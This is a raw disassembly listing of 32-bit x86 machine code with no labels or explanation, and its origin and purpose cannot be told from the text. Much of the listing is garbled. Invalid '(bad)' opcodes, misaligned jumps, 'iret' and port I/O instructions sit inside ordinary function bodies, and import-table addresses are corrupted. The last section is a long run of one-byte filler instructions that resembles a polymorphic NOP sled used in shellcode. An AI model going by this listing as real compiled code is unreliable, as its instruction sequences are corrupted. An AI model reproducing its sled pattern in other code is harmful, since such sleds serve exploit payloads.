  4096ad:	e8 4e ac ff ff       	call   0x404300
  4096b2:	33 c0                	xor    %eax,%eax
  4096b4:	5f                   	pop    %edi
  4096b5:	5e                   	pop    %esi
  4096b6:	5b                   	pop    %ebx
  4096b7:	8b e5                	mov    %ebp,%esp
  4096b9:	5d                   	pop    %ebp
  4096ba:	c2 14 00             	ret    $0x14
  4096bd:	20 90 90 55 8b ec    	and    %dl,-0x1374aa70(%eax)
  4096c3:	83 ec 38             	sub    $0x38,%esp
  4096c6:	56                   	push   %esi
  4096c7:	8b 75 08             	mov    0x8(%ebp),%esi
  4096ca:	8d 45 c8             	lea    -0x38(%ebp),%eax
  4096cd:	c7                   	(bad)
  4096ce:	e3 fc                	jecxz  0x4096cc
  4096d0:	00 00                	add    %al,(%eax)
  4096d2:	00 00                	add    %al,(%eax)
  4096d4:	8b 4e 04             	mov    0x4(%esi),%ecx
  4096d7:	50                   	push   %eax
  4096d8:	51                   	push   %ecx
  4096d9:	ff 15 d0 c0 40 00    	call   *0x40c0d0
  4096df:	85 c0                	test   %eax,%eax
  4096e1:	6c                   	insb   (%dx),%es:(%edi)
  4096e2:	0f 57 87 c8 07 6a 02 	xorps  0x26a07c8(%edi),%xmm0
  4096e9:	74 07                	je     0x4096f2
  4096eb:	33 c0                	xor    %eax,%eax
  4096ed:	5e                   	pop    %esi
  4096ee:	8b d9                	mov    %ecx,%ebx
  4096f0:	2d ee 53 46 0c       	sub    $0xc4653ee,%eax
  4096f5:	85 c0                	test   %eax,%eax
  4096f7:	74 11                	je     0x40970a
  4096f9:	c7 40 08 00 33 00 00 	movl   $0x3300,0x8(%eax)
  409700:	8b 56 0c             	mov    0xc(%esi),%edx
  409703:	c7 42 0c 00 00 00 0b 	movl   $0xb000000,0xc(%edx)
  40970a:	8b 46 0c             	mov    0xc(%esi),%eax
  40970d:	8b 56 04             	mov    0x4(%esi),%edx
  409710:	2a 8d 4d fc 50 51    	sub    0x5150fc4d(%ebp),%cl
  409716:	6a 43                	push   $0x43
  409718:	eb 00                	jmp    0x40971a
  40971a:	6a 00                	push   $0x0
  40971c:	6a 00                	push   $0x0
  40971e:	68 c4 00 6c 00       	push   $0x6c00c4
  409723:	cf                   	iret
  409724:	ff 15 b8 c0 40 00    	call   *0x40c0b8
  40972a:	85 c0                	test   %eax,%eax
  40972c:	74 08                	je     0x409736
  40972e:	34 33                	xor    $0x33,%al
  409730:	c0 5e 8b e5          	rcrb   $0xe5,-0x75(%esi)
  409734:	c3                   	ret
  409735:	c3                   	ret
  409736:	8b 3d 98 c0 40 04    	mov    0x440c098,%edi
  40973c:	73 d7                	jae    0x409715
  40973e:	85 c0                	test   %eax,%eax
  409740:	75 06                	jne    0x409748
  409742:	5f                   	pop    %edi
  409743:	5e                   	pop    %esi
  409744:	8b e5                	mov    %ebp,%esp
  409746:	5d                   	pop    %ebp
  409747:	c3                   	ret
  409748:	ff d7                	call   *%edi
  40974a:	05 98 50 0a 00       	add    $0xa5098,%eax
  40974f:	3d 65 82 0b 00       	cmp    $0xb8265,%eax
  409754:	0f 85 b2 00 00 00    	jne    0x40980c
  40975a:	8b 3d c6 c0 40 00    	mov    0x40c0c6,%edi
  409760:	8b 4e 14             	mov    0x14(%esi),%ecx
  409763:	8b 46 53             	mov    0x53(%esi),%eax
  409766:	85 c9                	test   %ecx,%ecx
  409768:	7c 6a                	jl     0x4097d4
  40976a:	7f 04                	jg     0x409770
  40976c:	85 39                	test   %edi,(%ecx)
  40976e:	76 10                	jbe    0x409780
  409770:	6e                   	outsb  %ds:(%esi),(%dx)
  409771:	00 68 e8             	add    %ch,-0x18(%eax)
  409774:	03 00                	add    (%eax),%eax
  409776:	db 51 50             	fistl  0x50(%ecx)
  409779:	e8 12 1e 00 00       	call   0x40b590
  40977e:	3a 0d 23 c1 83 f8    	cmp    0xf883c123,%cl
  409784:	ff 75 04             	push   0x4(%ebp)
  409787:	0b c0                	or     %eax,%eax
  409789:	eb 02                	jmp    0x40978d
  40978b:	7d da                	jge    0x409767
  40978d:	50                   	push   %eax
  40978e:	8b 46 0c             	mov    0xc(%esi),%eax
  409791:	8b 48 10             	mov    0x10(%eax),%ecx
  409794:	51                   	push   %ecx
  409795:	ff d7                	call   *%edi
  409797:	3d 80 84 4d 00       	cmp    $0x4d8480,%eax
  40979c:	e2 b9                	loop   0x409757
  40979e:	85 ab ac 31 a1 ec    	test   %ebp,-0x135ece54(%ebx)
  4097a4:	05 41 00 8b 50       	add    $0x508b0041,%eax
  4097a9:	04 85                	add    $0x85,%al
  4097ab:	c0 7d 9e 50          	sarb   $0x50,-0x62(%ebp)
  4097af:	68 ec 00 41 00       	push   $0x4100ec
  4097b4:	50                   	push   %eax
  4097b5:	c0 86 11 00 00 83 c4 	rolb   $0xc4,-0x7cffffef(%esi)
  4097bc:	44                   	inc    %esp
  4097bd:	a3 ec 05 41 00       	mov    %eax,0x4105ec
  4097c2:	85 c0                	test   %eax,%eax
  4097c4:	74 05                	je     0x4097cb
  4097c6:	57                   	push   %edi
  4097c7:	ff d0                	call   *%eax
  4097c9:	eb 08                	jmp    0x4097d3
  4097cb:	90                   	nop
  4097cc:	01 ff                	add    %edi,%edi
  4097ce:	15 4c c4 40 fa       	adc    $0xfa40c44c,%eax
  4097d3:	8b 46 0c             	mov    0xc(%esi),%eax
  4097d6:	8b 4e c8             	mov    -0x38(%esi),%ecx
  4097d9:	8d 55 fc             	lea    -0x4(%ebp),%edx
  4097dc:	6a cf                	push   $0xffffffcf
  4097de:	52                   	push   %edx
  4097df:	50                   	push   %eax
  4097e0:	5e                   	pop    %esi
  4097e1:	ff 15 b4 c0 40 24    	call   *0x2440c0b4
  4097e7:	85 c0                	test   %eax,%eax
  4097e9:	74 de                	je     0x4097c9
  4097eb:	5f                   	pop    %edi
  4097ec:	33 c0                	xor    %eax,%eax
  4097ee:	5e                   	pop    %esi
  4097ef:	8b 4a 5d             	mov    0x5d(%edx),%ecx
  4097f2:	c3                   	ret
  4097f3:	8b 35 98 c0 ca 00    	mov    0xcac098,%esi
  4097f9:	ff d6                	call   *%esi
  4097fb:	85 b7 75 06 5f 5e    	test   %esi,0x5e5f0675(%edi)
  409801:	8b e5                	mov    %ebp,%esp
  409803:	5d                   	pop    %ebp
  409804:	c3                   	ret
  409805:	ff d6                	call   *%esi
  409807:	05 80 fc 0a 82       	add    $0x820afc80,%eax
  40980c:	5f                   	pop    %edi
  40980d:	d5 8b                	aad    $0x8b
  40980f:	e5 5d                	in     $0x5d,%eax
  409811:	c3                   	ret
  409812:	90                   	nop
  409813:	90                   	nop
  409814:	90                   	nop
  409815:	90                   	nop
  409816:	90                   	nop
  409817:	90                   	nop
  409818:	90                   	nop
  409819:	90                   	nop
  40981a:	90                   	nop
  40981b:	09 90 90 90 90 55    	or     %edx,0x55909090(%eax)
  409821:	8b ec                	mov    %esp,%ebp
  409823:	56                   	push   %esi
  409824:	8b 75 08             	mov    0x8(%ebp),%esi
  409827:	0d e8 13 fb ff       	or     $0xfffb13e8,%eax
  40982c:	ff 83 f1 04 85 c0    	incl   -0x3f7afb0f(%ebx)
  409832:	75 1d                	jne    0x409851
  409834:	8b 11                	mov    (%ecx),%edx
  409836:	68 40 88 40 2a       	push   $0x2a408840
  40983b:	56                   	push   %esi
  40983c:	50                   	push   %eax
  40983d:	e8 fe bd 71 ff       	call   0xffb25640
  409842:	8b 76 b5             	mov    -0x4b(%esi),%esi
  409845:	85 f6                	test   %esi,%esi
  409847:	74 06                	je     0x40984f
  409849:	56                   	push   %esi
  40984a:	e8 51 e5 00 00       	call   0x417da0
  40984f:	33 c0                	xor    %eax,%eax
  409851:	5e                   	pop    %esi
  409852:	5d                   	pop    %ebp
  409853:	c2 04 00             	ret    $0x4
  409856:	90                   	nop
  409857:	90                   	nop
  409858:	4f                   	dec    %edi
  409859:	90                   	nop
  40985a:	90                   	nop
  40985b:	90                   	nop
  40985c:	90                   	nop
  40985d:	90                   	nop
  40985e:	90                   	nop
  40985f:	90                   	nop
  409860:	55                   	push   %ebp
  409861:	8b 75 53             	mov    0x53(%ebp),%esi
  409864:	1d 8b 75 42 57       	sbb    $0x5742758b,%eax
  409869:	8b c7                	mov    %edi,%eax
  40986b:	0c 33                	or     $0x33,%al
  40986d:	db 8b 39 08 e4 45    	fisttpl 0x45e40839(%ebx)
  409873:	10 2a                	adc    %ch,(%edx)
  409875:	57                   	push   %edi
  409876:	51                   	push   %ecx
  409877:	89 75 10             	mov    %esi,0x10(%ebp)
  40987a:	e8 d1 15 00 00       	call   0x40ae50
  40987f:	8b 4d 05             	mov    0x5(%ebp),%ecx
  409882:	03 f9                	add    %ecx,%edi
  409884:	2b f1                	sub    %ecx,%esi
  409886:	03 d9                	add    %ecx,%ebx
  409888:	85 c0                	test   %eax,%eax
  40988a:	75 04                	jne    0x409890
  40988c:	85 f6                	test   %esi,%esi
  40988e:	77 33                	ja     0x4098c3
  409890:	8b 4d 14             	mov    0x14(%ebp),%ecx
  409893:	85 c9                	test   %ecx,%ecx
  409895:	74 02                	je     0x409899
  409897:	89 19                	mov    %ebx,(%ecx)
  409899:	55                   	push   %ebp
  40989a:	5e                   	pop    %esi
  40989b:	5b                   	pop    %ebx
  40989c:	ea c2 f3 ba 55 8b ec 	ljmp   $0xec8b,$0x55baf3c2
  4098a3:	83 ec 54             	sub    $0x54,%esp
  4098a6:	01 dc                	add    %ebx,%esp
  4098a8:	08 41 00             	or     %al,0x0(%ecx)
  4098ab:	53                   	push   %ebx
  4098ac:	0f 16 56 0b          	movhps 0xb(%esi),%xmm2
  4098b0:	f8                   	clc
  4098b1:	1e                   	push   %ds
  4098b2:	57                   	push   %edi
  4098b3:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4098b6:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4098b9:	89 55 79             	mov    %edx,0x79(%ebp)
  4098bc:	7d 1a                	jge    0x4098d8
  4098be:	8b ac fd 8b 4d 08 50 	mov    0x50084d8b(%ebp,%edi,8),%ebp
  4098c5:	c5 e8 05             	(bad)
  4098c8:	06                   	push   %es
  4098c9:	3a 00                	cmp    (%eax),%al
  4098cb:	83 c4 08             	add    $0x8,%esp
  4098ce:	5f                   	pop    %edi
  4098cf:	5e                   	pop    %esi
  4098d0:	5b                   	pop    %ebx
  4098d1:	8b e5                	mov    %ebp,%esp
  4098d3:	5d                   	pop    %ebp
  4098d4:	6d                   	insl   (%dx),%es:(%edi)
  4098d5:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4098d8:	f7 c1 64 00 73 b8    	test   $0xb8730064,%ecx
  4098de:	15 84 d9 02 00       	adc    $0x2d984,%eax
  4098e3:	00 7b f1             	add    %bh,-0xf(%ebx)
  4098e6:	33 db                	xor    %ebx,%ebx
  4098e8:	81 e6 00 00 11 d9    	and    $0xd9110000,%esi
  4098ee:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4098f1:	89 55 ec             	mov    %edx,-0x14(%ebp)
  4098f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4098f5:	0a bb 45 fc 01 00    	or     0x1fc45(%ebx),%bh
  4098fb:	00 00                	add    %al,(%eax)
  4098fd:	8b 21                	mov    (%ecx),%esp
  4098ff:	b2 8b                	mov    $0x8b,%dl
  409901:	f9                   	stc
  409902:	81 e7 00 00 c2 00    	and    $0xc20000,%edi
  409908:	e0 f4                	loopne 0x4098fe
  40990a:	ea 51 02 89 5d fc 81 	ljmp   $0x81fc,$0x5d890251
  409911:	e1 00                	loope  0x409913
  409913:	98                   	cwtl
  409914:	70 87                	jo     0x40989d
  409916:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  409919:	74 06                	je     0x409921
  40991b:	83 cb 04             	or     $0x4,%ebx
  40991e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40991f:	5d                   	pop    %ebp
  409920:	fc                   	cld
  409921:	8b 45 14             	mov    0x14(%ebp),%eax
  409924:	83 76 02 a1          	xorl   $0xffffffa1,0x2(%esi)
  409928:	85 05 3a 00 00 8b    	test   %eax,0x8b00003a
  40992e:	f9                   	stc
  40992f:	a3 6a 04 ae 78       	mov    %eax,0x78ae046a
  409934:	00 41 00             	add    %al,0x0(%ecx)
  409937:	3f                   	aas
  409938:	33 db                	xor    %ebx,%ebx
  40993a:	ff 15 04 15 40 41    	call   *0x41401504
  409940:	83 c4 0c             	add    $0xc,%esp
  409943:	85 c0                	test   %eax,%eax
  409945:	75 2d                	jne    0x409974
  409947:	8b 45 0c             	mov    0xc(%ebp),%eax
  40994a:	bb 04 4c 00 00       	mov    $0x4c04,%ebx
  40994f:	53                   	push   %ebx
  409950:	83 c0 08             	add    $0x8,%eax
  409953:	68 80 01 41 00       	push   $0x410180
  409958:	60                   	pusha
  409959:	46                   	inc    %esi
  40995a:	15 04 c1 40 5e       	adc    $0x5e40c104,%eax
  40995f:	83 c4 0c             	add    $0xc,%esp
  409962:	85 b4 ef 0e 8b 4d 0c 	test   %esi,0xc4d8b0e(%edi,%ebp,8)
  409969:	bb 06 00 00 00       	mov    $0x6,%ebx
  40996e:	62 c7 41             	(bad) {%k4}
  409971:	0c 5c                	or     $0x5c,%al
  409973:	00 a1 c9 51 41 ac    	add    %ah,-0x53beae37(%ecx)
  409979:	85 c0                	test   %eax,%eax
  40997b:	75 19                	jne    0x409996
  40997d:	50                   	push   %eax
  40997e:	fc                   	cld
  40997f:	68 01 41 00 6a       	push   $0x6a004101
  409984:	66 e8 57 0f          	callw  0xa8df
  409988:	00 00                	add    %al,(%eax)
  40998a:	83 c4 85             	add    $0xffffff85,%esp
  40998d:	a3 4c 06 41 dc       	mov    %eax,0xdc41064c
  409992:	85 0b                	test   %ecx,(%ebx)
  409994:	74 38                	je     0x4099ce
  409996:	b0 4d                	mov    $0x4d,%al
  409998:	76 22                	jbe    0x4099bc
  40999a:	55                   	push   %ebp
  40999b:	81 f7 d9 52 8d 55    	xor    $0x558d52d9,%edi
  4099a1:	f0 1b c9             	lock sbb %ecx,%ecx
  4099a4:	6a 00                	push   $0x0
  4099a6:	23 ca                	and    %edx,%ecx
  4099a8:	8d 55 f8             	lea    -0x8(%ebp),%edx
  4099ab:	f7 df                	neg    %edi
  4099ad:	51                   	push   %ecx
  4099ae:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4099b1:	90                   	nop
  4099b2:	9b                   	fwait
  4099b3:	23 ee                	and    %esi,%ebp
  4099b5:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4099b8:	f7 2d 1b f6 57 23    	imull  0x2357f61b
  4099be:	e3 8b                	jecxz  0x40994b
  4099c0:	55                   	push   %ebp
  4099c1:	0c 56                	or     $0x56,%al
  4099c3:	51                   	push   %ecx
  4099c4:	8d 0c 61             	lea    (%ecx,%eiz,2),%ecx
  4099c7:	7b 01                	jnp    0x4099ca
  4099c9:	51                   	push   %ecx
  4099ca:	ff d0                	call   *%eax
  4099cc:	eb 0a                	jmp    0x4099d8
  4099ce:	6a 01                	push   $0x1
  4099d0:	ff 15 4c 39 9a 53    	call   *0x539a394c
  4099d6:	33 d5                	xor    %ebp,%edx
  4099d8:	83 55 06 63          	adcl   $0x63,0x6(%ebp)
  4099dc:	09 8b 55 0c a6 ac    	or     %ecx,-0x5359f3ab(%ebx)
  4099e2:	6d                   	insl   (%dx),%es:(%edi)
  4099e3:	0c 43                	or     $0x43,%al
  4099e5:	00 33                	add    %dh,(%ebx)
  4099e7:	c9                   	leave
  4099e8:	3b cb                	cmp    %ebx,%ecx
  4099ea:	0f 85 b1 00 00 b5    	jne    0xb5409aa1
  4099f0:	8b 7d 08             	mov    0x8(%ebp),%edi
  4099f3:	98                   	cwtl
  4099f4:	55                   	push   %ebp
  4099f5:	ec                   	in     (%dx),%al
  4099f6:	68 20 57 40 7d       	push   $0x7d405720
  4099fb:	68 60 9c 2f 00       	push   $0x2f9c60
  409a00:	8b 07                	mov    (%edi),%eax
  409a02:	52                   	push   %edx
  409a03:	4e                   	dec    %esi
  409a04:	e8 f7 bb ff ff       	call   0x405600
  409a09:	e9 b3 00 00 00       	jmp    0x409ac1
  409a0e:	83 f8 01             	cmp    $0x1,%eax
  409a11:	75 37                	jne    0x409a4a
  409a13:	a1 50 06 41 24       	mov    0x24410650,%eax
  409a18:	3b c1                	cmp    %ecx,%eax
  409a1a:	75 1c                	jne    0x409a38
  409a1c:	52                   	push   %edx
  409a1d:	68 50 01 41 00       	push   $0x410150
  409a22:	6a 01                	push   $0x1
  409a24:	e8 17 0f 00 00       	call   0x40a940
  409a29:	83 c4 0c             	add    $0xc,%esp
  409a2c:	e2 50                	loop   0x409a7e
  409a2e:	33 41 c7             	xor    -0x39(%ecx),%eax
  409a31:	85 c0                	test   %eax,%eax
  409a33:	44                   	inc    %esp
  409a34:	5f                   	pop    %edi
  409a35:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  409a38:	8d 55 ec             	lea    -0x14(%ebp),%edx
  409a3b:	f7 d9                	neg    %ecx
  409a3d:	52                   	push   %edx
  409a3e:	8d 55 f0             	lea    -0x10(%ebp),%edx
  409a41:	1b f2                	sbb    %edx,%esi
  409a43:	6a 00                	push   $0x0
  409a45:	23 ca                	and    %edx,%ecx
  409a47:	20 b9 f8 f7 df 51    	and    %bh,0x51dff7f8(%ecx)
  409a4d:	8d 4d 28             	lea    0x28(%ebp),%ecx
  409a50:	1b 7a 23             	sbb    0x23(%edx),%edi
  409a53:	f9                   	stc
  409a54:	8b 8d 0c f7 de 1b    	mov    0x1bdef70c(%ebp),%ecx
  409a5a:	f6 3e                	idivb  (%esi)
  409a5c:	23 04 56             	and    (%esi,%edx,2),%eax
  409a5f:	53                   	push   %ebx
  409a60:	6a 01                	push   $0x1
  409a62:	51                   	push   %ecx
  409a63:	ff d0                	call   *%eax
  409a65:	4e                   	dec    %esi
  409a66:	7c ff                	jl     0x409a67
  409a68:	ff 16                	call   *(%esi)
  409a6a:	3b c2                	cmp    %edx,%eax
  409a6c:	7e 85                	jle    0x4099f3
  409a6e:	5e                   	pop    %esi
  409a6f:	00 0f                	add    %cl,(%edi)
  409a71:	00 a1 54 06 41 00    	add    %ah,0x410654(%ecx)
  409a77:	3b 40 75             	cmp    0x75(%eax),%eax
  409a7a:	60                   	pusha
  409a7b:	52                   	push   %edx
  409a7c:	94                   	xchg   %eax,%esp
  409a7d:	40                   	inc    %eax
  409a7e:	01 41 18             	add    %eax,0x18(%ecx)
  409a81:	f0 01 e8             	lock add %ebp,%eax
  409a84:	6f                   	outsl  %ds:(%esi),(%dx)
  409a85:	0e                   	push   %cs
  409a86:	6a 00                	push   $0x0
  409a88:	83 7e 0c a3          	cmpl   $0xffffffa3,0xc(%esi)
  409a8c:	7a 06                	jp     0x409a94
  409a8e:	41                   	inc    %ecx
  409a8f:	00 85 c0 d4 a1 6a    	add    %al,0x6aa1d4c0(%ebp)
  409a95:	01 ff                	add    %edi,%edi
  409a97:	15 4c c0 40 00       	adc    $0x40c04c,%eax
  409a9c:	e9 4f ff ff ff       	jmp    0x4099f0
  409aa1:	8b 7d 08             	mov    0x8(%ebp),%edi
  409aa4:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  409aa7:	89 4d 3c             	mov    %ecx,0x3c(%ebp)
  409aaa:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  409aad:	39 4d da             	cmp    %ecx,-0x26(%ebp)
  409ab0:	74 61                	je     0x409b13
  409ab2:	8b 55 10             	mov    0x10(%ebp),%edx
  409ab5:	52                   	push   %edx
  409ab6:	57                   	push   %edi
  409ab7:	e8 14 c3 00 00       	call   0x415dd0
  409abc:	83 c4 08             	add    $0x8,%esp
  409abf:	eb 52                	jmp    0x409b13
  409ac1:	8b 45 f8             	mov    -0x8(%ebp),%eax
  409ac4:	33 4b 3b             	xor    0x3b(%ebx),%ecx
  409ac7:	c1 4e 0e 89          	rorl   $0x89,0xe(%esi)
  409acb:	47                   	inc    %edi
  409acc:	10 3a                	adc    %bh,(%edx)
  409ace:	47                   	inc    %edi
  409acf:	04 0d                	add    $0xd,%al
  409ad1:	10 00                	adc    %al,(%eax)
  409ad3:	01 00                	add    %eax,(%eax)
  409ad5:	89 47 b6             	mov    %eax,-0x4a(%edi)
  409ad8:	8b b3 ad 3b c1 74    	mov    0x74c13bad(%ebx),%esi
  409ade:	0e                   	push   %cs
  409adf:	f8                   	clc
  409ae0:	47                   	inc    %edi
  409ae1:	14 b3                	adc    $0xb3,%al
  409ae3:	47                   	inc    %edi
  409ae4:	04 d5                	add    $0xd5,%al
  409ae6:	00 00                	add    %al,(%eax)
  409ae8:	02 00                	add    (%eax),%al
  409aea:	89 47 04             	mov    %eax,0x4(%edi)
  409aed:	8b 45 f0             	mov    -0x10(%ebp),%eax
  409af0:	3b c1                	cmp    %ecx,%eax
  409af2:	04 b9                	add    $0xb9,%al
  409af4:	8b 4d 10             	mov    0x10(%ebp),%ecx
  409af7:	50                   	push   %eax
  409af8:	51                   	push   %ecx
  409af9:	57                   	push   %edi
  409afa:	e8 81 01 00 00       	call   0x409c80
  409aff:	28 c4                	sub    %al,%ah
  409b01:	0c eb                	or     $0xeb,%al
  409b03:	01 8f bf b8 78 eb    	add    %ecx,-0x14874741(%edi)
  409b09:	a1 05 af 8b e5       	mov    0xe58baf05,%eax
  409b0e:	5d                   	pop    %ebp
  409b0f:	c3                   	ret
  409b10:	8b 7d 7e             	mov    0x7e(%ebp),%edi
  409b13:	83 3d dc 08 41 00 32 	cmpl   $0x32,0x4108dc
  409b1a:	0f 8c d2 01 00 00    	jl     0x409cf2
  409b20:	7a 4a                	jp     0x409b6c
  409b22:	16                   	push   %ss
  409b23:	bb d1 02 67 00       	mov    $0x6702d1,%ebx
  409b28:	85 98 0f 3f 0b 01    	test   %ebx,0x10b3f0f(%eax)
  409b2e:	00 00                	add    %al,(%eax)
  409b30:	83 7f 0c 01          	cmpl   $0x1,0xc(%edi)
  409b34:	5b                   	pop    %ebx
  409b35:	c3                   	ret
  409b36:	01 01                	add    %eax,(%ecx)
  409b38:	00 00                	add    %al,(%eax)
  409b3a:	9b                   	fwait
  409b3b:	75 14                	jne    0x409b51
  409b3d:	85 f6                	test   %esi,%esi
  409b3f:	75 ff                	jne    0x409b40
  409b41:	a1 74 06 86 87       	mov    0x87860674,%eax
  409b46:	85 c0                	test   %eax,%eax
  409b48:	75 19                	jne    0x409b63
  409b4a:	5f                   	pop    %edi
  409b4b:	8c 28                	mov    %gs,(%eax)
  409b4d:	93                   	xchg   %eax,%ebx
  409b4e:	41                   	inc    %ecx
  409b4f:	b7 6a                	mov    $0x6a,%bh
  409b51:	05 5a e9 6c 00       	add    $0x6ce95a,%eax
  409b56:	00 83 c4 0c 52 74    	add    %al,0x74520cc4(%ebx)
  409b5c:	06                   	push   %es
  409b5d:	41                   	inc    %ecx
  409b5e:	00 85 c0 74 3b 6a    	add    %al,0x6a3b74c0(%ebp)
  409b64:	05 8d 4d c4 6a       	add    $0x6ac44d8d,%eax
  409b69:	20 51 8b             	and    %dl,-0x75(%ecx)
  409b6c:	4d                   	dec    %ebp
  409b6d:	0c f2                	or     $0xf2,%al
  409b6f:	55                   	push   %ebp
  409b70:	e4 52                	in     $0x52,%al
  409b72:	51                   	push   %ecx
  409b73:	ff d0                	call   *%eax
  409b75:	85 c0                	test   %eax,%eax
  409b77:	ed                   	in     (%dx),%eax
  409b78:	85 40 00             	test   %eax,0x0(%eax)
  409b7b:	00 00                	add    %al,(%eax)
  409b7d:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  409b80:	85 2c 0f             	test   %ebp,(%edi,%ecx,1)
  409b83:	85 32                	test   %esi,(%edx)
  409b85:	00 00                	add    %al,(%eax)
  409b87:	00 8b 45 ad 8b 55    	add    %cl,0x558bad45(%ebx)
  409b8d:	c4 89 47 34 8b b7    	les    -0x4874cbb9(%ecx),%ecx
  409b93:	04 89                	add    $0x89,%al
  409b95:	d9 fa                	fsqrt
  409b97:	0b c3                	or     %ebx,%eax
  409b99:	e9 0e 54 00 00       	jmp    0x40efac
  409b9e:	6a 01                	push   $0x1
  409ba0:	ff 15 4c 0a 8a 00    	call   *0x8a0a4c
  409ba6:	77 d5                	ja     0x409b7d
  409ba8:	8b 1d 4c c0 40 03    	mov    0x340c04c,%ebx
  409bae:	6a 79                	push   $0x79
  409bb0:	ff d3                	call   *%ebx
  409bb2:	83 fe 02             	cmp    $0x2,%esi
  409bb5:	75 1c                	jne    0x409bd3
  409bb7:	a1 60 4f 41 fa       	mov    0xfa414f60,%eax
  409bbc:	85 c0                	test   %eax,%eax
  409bbe:	75 39                	jne    0x409bf9
  409bc0:	d2 68 10             	shrb   %cl,0x10(%eax)
  409bc3:	01 41 00             	add    %eax,0x0(%ecx)
  409bc6:	50                   	push   %eax
  409bc7:	e8 0b 0d 00 00       	call   0x40a8d7
  409bcc:	a3 7a 06 41 00       	mov    %eax,0x41067a
  409bd1:	eb 1f                	jmp    0x409bf2
  409bd3:	2a fe                	sub    %dh,%bh
  409bd5:	01 75 37             	add    %esi,0x37(%ebp)
  409bd8:	a1 60 06 41 63       	mov    0x63410660,%eax
  409bdd:	85 c0                	test   %eax,%eax
  409bdf:	75 18                	jne    0x409bf9
  409be1:	94                   	xchg   %eax,%esp
  409be2:	68 f8 00 41 00       	push   $0x4100f8
  409be7:	50                   	push   %eax
  409be8:	e8 53 0d 00 00       	call   0x40a940
  409bed:	a3 5c 06 41 00       	mov    %eax,0x41065c
  409bf2:	83 c4 0c             	add    $0xc,%esp
  409bf5:	85 c0                	test   %eax,%eax
  409bf7:	74 0e                	je     0x409c07
  409bf9:	8b ec                	mov    %esp,%ebp
  409bfb:	0c 8d                	or     $0x8d,%al
  409bfd:	93                   	xchg   %eax,%ebx
  409bfe:	70 51                	jo     0x409c51
  409c00:	52                   	push   %edx
  409c01:	ff d0                	call   *%eax
  409c03:	27                   	daa
  409c04:	f0 66 0b 6a 93       	lock or -0x6d(%edx),%bp
  409c09:	ff d3                	call   *%ebx
  409c0b:	33 f6                	xor    %esi,%esi
  409c0d:	eb 12                	jmp    0x409c21
  409c0f:	8b bd 0c 83 fe 39    	mov    0x39fe830c(%ebp),%edi
  409c15:	75 ee                	jne    0x409c05
  409c17:	ff 6b 98             	ljmp   *-0x68(%ebx)
  409c1a:	c0 40 00 8e          	rolb   $0x8e,0x0(%eax)
  409c1e:	c0 75 a6 8b          	shlb   $0x8b,-0x5a(%ebp)
  409c22:	4d                   	dec    %ebp
  409c23:	08 33                	or     %dh,(%ebx)
  409c25:	c0 0b c6             	rorb   $0xc6,(%ebx)
  409c28:	7a d2                	jp     0x409bfc
  409c2a:	89 47 60             	mov    %eax,0x60(%edi)
  409c2d:	8b 47 04             	mov    0x4(%edi),%eax
  409c30:	13 ca                	adc    %edx,%ecx
  409c32:	80 cc 02             	or     $0x2,%ah
  409c35:	89 f6                	mov    %esi,%esi
  409c37:	34 89                	xor    $0x89,%al
  409c39:	40                   	inc    %eax
  409c3a:	e9 8b 47 27 93       	jmp    0x9367e3ca
  409c3f:	93                   	xchg   %eax,%ebx
  409c40:	43                   	inc    %ebx
  409c41:	93                   	xchg   %eax,%ebx
  409c42:	48                   	dec    %eax
  409c43:	4a                   	dec    %edx
  409c44:	41                   	inc    %ecx
  409c45:	99                   	cltd
  409c46:	fd                   	std
  409c47:	f8                   	clc
  409c48:	f8                   	clc
  409c49:	98                   	cwtl
  409c4a:	90                   	nop
  409c4b:	27                   	daa
  409c4c:	41                   	inc    %ecx
  409c4d:	90                   	nop
  409c4e:	f8                   	clc
  409c4f:	2f                   	das
  409c50:	fd                   	std
  409c51:	43                   	inc    %ebx
  409c52:	27                   	daa
  409c53:	3f                   	aas
  409c54:	42                   	inc    %edx
  409c55:	43                   	inc    %ebx
  409c56:	43                   	inc    %ebx
  409c57:	90                   	nop
  409c58:	49                   	dec    %ecx
  409c59:	fd                   	std
  409c5a:	41                   	inc    %ecx
  409c5b:	4b                   	dec    %ebx
  409c5c:	48                   	dec    %eax
  409c5d:	f8                   	clc
  409c5e:	f5                   	cmc
  409c5f:	27                   	daa
  409c60:	27                   	daa
  409c61:	41                   	inc    %ecx
  409c62:	9b                   	fwait
  409c63:	90                   	nop
  409c64:	f8                   	clc
  409c65:	9b                   	fwait
  409c66:	fd                   	std
  409c67:	41                   	inc    %ecx
  409c68:	90                   	nop
  409c69:	41                   	inc    %ecx
  409c6a:	f5                   	cmc
  409c6b:	99                   	cltd
  409c6c:	d6                   	salc
  409c6d:	9b                   	fwait
  409c6e:	92                   	xchg   %eax,%edx
  409c6f:	2f                   	das
  409c70:	9f                   	lahf
  409c71:	92                   	xchg   %eax,%edx
  409c72:	99                   	cltd
  409c73:	92                   	xchg   %eax,%edx
  409c74:	9b                   	fwait
  409c75:	43                   	inc    %ebx
  409c76:	d6                   	salc
  409c77:	40                   	inc    %eax
  409c78:	48                   	dec    %eax
  409c79:	91                   	xchg   %eax,%ecx
  409c7a:	4a                   	dec    %edx
  409c7b:	90                   	nop
  409c7c:	9f                   	lahf
  409c7d:	99                   	cltd
  409c7e:	90                   	nop
  409c7f:	99                   	cltd
  409c80:	2f                   	das
  409c81:	27                   	daa
  409c82:	42                   	inc    %edx
  409c83:	27                   	daa
  409c84:	9b                   	fwait
  409c85:	fd                   	std
  409c86:	49                   	dec    %ecx
  409c87:	f9                   	stc
  409c88:	37                   	aaa
  409c89:	92                   	xchg   %eax,%edx
  409c8a:	f8                   	clc
  409c8b:	f9                   	stc
  409c8c:	27                   	daa
  409c8d:	93                   	xchg   %eax,%ebx
  409c8e:	4b                   	dec    %ebx
  409c8f:	90                   	nop
  409c90:	9f                   	lahf
  409c91:	93                   	xchg   %eax,%ebx
  409c92:	fc                   	cld
  409c93:	98                   	cwtl
